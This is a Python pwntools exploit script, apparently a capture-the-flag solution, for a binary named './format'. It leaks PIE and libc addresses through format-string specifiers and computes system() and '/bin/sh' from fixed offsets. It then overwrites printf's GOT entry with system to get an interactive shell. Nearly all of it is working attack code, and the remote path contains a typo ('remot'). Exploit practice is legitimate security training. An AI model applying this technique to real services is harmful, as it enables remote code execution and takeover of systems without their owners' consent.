#!/usr/bin/python3

from pwn import *

global io
global elf

def start():
    
    file_name = './format'
    elf = context.binary = ELF(file_name)
    context.log_level = 'debug'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-pwndbg
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remot(host, int(port))
    return process(file_name)

def send_payload(offset):
    payload = f'%{offset}$p'
    io.sendline(payload)
    return io.recv()

def send_payload2(payload):
    io.sendline(payload)
    return io.recv()

def runmain():
    global io
    io = start()

    piebase_offset = 4288
    io.sendline(f'%52$p')
    data = io.recvline().strip().decode()
    info(f'leaked pie address: {data}')
    piebase = int(data[2:], 16) - 4288
    info(f'piebase: {hex(piebase)}')
    
    addr_diff = 679998
    data = send_payload(3).strip().decode()
    info(f'leaked_address: {data}')

    leaked_addr = int(data[2:], 0x10)
    system_addr = leaked_addr - addr_diff

    info(f'system_addr: {hex(system_addr)}')

    libc_base = system_addr - 0x48e50
    bin_sh = libc_base + 0x18a152
    printf_address = piebase + 0x3fc0
    info(f'printf_piebase_addr: {hex(printf_address)}')
    # printf_address = libc_base + 0x56cf0
    # info(f'printf_libc_addr: {hex(printf_address)}')

    info(f'libc_base: {hex(libc_base)}')
    info(f'bin_sh: {hex(bin_sh)}')
    info(f'printf: {hex(printf_address)}')
    input('IDA>')

    format_string = FmtStr(execute_fmt=send_payload2, offset=6)
    format_string.write(printf_address, system_addr)
    format_string.execute_writes()
    # io.sendline('/bin/sh')
    io.interactive()

if __name__ == '__main__':
    runmain()